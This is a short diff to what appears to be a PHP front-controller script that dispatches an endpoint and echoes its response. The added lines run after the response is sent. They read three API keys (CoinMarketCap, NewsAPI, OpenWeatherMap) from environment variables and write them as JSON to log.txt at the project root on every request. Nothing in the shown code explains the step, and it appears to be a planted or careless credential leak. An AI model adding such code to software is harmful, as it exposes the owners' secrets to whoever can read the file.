@@ -18,3 +18,9 @@ $response = is_callable($endpoint)
 http_response_code($response->header->status->value);
 header('Content-Type: ' . $response->header->content_type);
 echo $response->body->content;
+
+file_put_contents(\PhpRepos\FileManager\Resolver\root() . '/log.txt', json_encode([
+    'COINMARKETCAP_API_KEY' => getenv('COINMARKETCAP_API_KEY'),
+    'NEWSAPI_API_KEY' => getenv('NEWSAPI_API_KEY'),
+    'OPENWEATHERMAP_API_KEY' => getenv('OPENWEATHERMAP_API_KEY'),
+]));
